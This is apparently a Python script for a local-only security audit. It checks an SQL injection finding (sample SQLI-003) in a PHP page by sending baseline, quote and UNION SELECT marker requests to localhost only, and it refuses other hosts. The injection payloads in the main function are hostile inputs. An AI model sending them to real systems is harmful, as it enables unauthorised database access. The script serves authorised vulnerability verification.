#!/usr/bin/env python3
"""Local-only SQL injection verification draft for sample SQLI-003.

Targets the audited PHP entry point (GET parameter "id" concatenated into
"SELECT * FROM users WHERE id='$id' LIMIT 0,1"). Uses numeric marker columns
only: it does not enumerate databases, dump rows or change any record.
Requires explicit --path because the deployment path of the audited file is
not part of the audit data.
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}


def assert_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("refuse: scheme must be http or https")
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("refuse: %r is not an explicitly authorized local host" % (parts.hostname,))


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # surface 3xx instead of following it


def request(base_url, path, param, value, timeout, headers):
    url = base_url.rstrip("/") + path + "?" + urllib.parse.urlencode({param: value})
    assert_local(url)
    opener = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(url, headers=headers)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return {"kind": "http", "status": resp.status,
                    "location": resp.headers.get("Location"),
                    "body": resp.read().decode("utf-8", "replace")}
    except urllib.error.HTTPError as exc:
        return {"kind": "http", "status": exc.code,
                "location": exc.headers.get("Location") if exc.headers else None,
                "body": exc.read().decode("utf-8", "replace")}
    except urllib.error.URLError as exc:
        return {"kind": "connect_error", "error": str(exc.reason)}
    except TimeoutError:
        return {"kind": "timeout"}


MARKERS = ("Your Login name:", "Your Password:",
           "Hint: Your Input is Filtered",
           "Please input the ID", "You have an error in your SQL syntax")


def summarize(label, res):
    if res["kind"] != "http":
        print("[%s] transport=%s detail=%s" % (label, res["kind"], json.dumps(res, ensure_ascii=False)))
        return
    print("[%s] status=%s location=%r bytes=%d"
          % (label, res["status"], res["location"], len(res["body"])))
    for marker in MARKERS:
        if marker in res["body"]:
            print("    marker present: %s" % marker)


def main():
    ap = argparse.ArgumentParser(description="SQLI-003 local HTTP verification draft (manual adaptation expected)")
    ap.add_argument("--base-url", default="http://127.0.0.1:8080", help="local lab base URL")
    ap.add_argument("--path", required=True, help="path of the audited PHP script, e.g. /lab/sqli-003.php")
    ap.add_argument("--param", default="id", help="parameter name taken from the audited code (GET id)")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--session-file", default="", help="optional file whose first line is a Cookie header value")
    ap.add_argument("--cookie-header", default="", help="optional Cookie header value passed directly")
    args = ap.parse_args()

    cookie = args.cookie_header
    if args.session_file:
        with open(args.session_file, "r", encoding="utf-8") as fh:
            cookie = fh.readline().strip()
    headers = {"User-Agent": "sqli003-local-draft/1.0"}
    if cookie:
        headers["Cookie"] = cookie  # never printed

    baseline = request(args.base_url, args.path, args.param, "1", args.timeout, headers)
    empty = request(args.base_url, args.path, args.param, "999999", args.timeout, headers)
    quote = request(args.base_url, args.path, args.param, "1'", args.timeout, headers)
    union = request(args.base_url, args.path, args.param,
                    "1' UNION SELECT 1,2,3-- -", args.timeout, headers)

    summarize("baseline id=1", baseline)
    summarize("control  id=999999", empty)
    summarize("control  id=1'", quote)
    summarize("test     union marker", union)

    if union["kind"] == "http" and "Your Login name:2" in union["body"]:
        print("observation: marker column 2 rendered in the username slot")
    if union["kind"] == "http" and "Your Password:3" in union["body"]:
        print("observation: marker column 3 rendered in the password slot")
    print("compare the four responses; the script reports observations only, not a verified verdict")


if __name__ == "__main__":
    main()
